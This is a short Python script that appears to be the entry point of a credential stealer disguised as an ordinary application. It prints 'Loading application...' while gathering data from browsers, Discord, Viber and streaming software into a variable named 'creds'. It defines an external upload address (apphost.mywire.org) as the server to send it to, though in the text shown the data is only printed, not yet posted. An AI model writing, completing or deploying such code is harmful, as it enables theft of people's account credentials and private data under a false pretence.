import sys
import json
import browser
import discord
import viber
import streaming
import requests
SERVER_ADDRESS = "http://apphost.mywire.org:3000/upload"

if __name__ == '__main__':
    print("Loading application...")
    data = {
        "browsers": browser.getAllData(),
        "discord": discord.getAllData(),
        "viber": viber.getAllData(),
        "streaming_software": streaming.getAllData()
    }

    print("Starting the application...")

    creds = json.dumps(data)
    print(creds)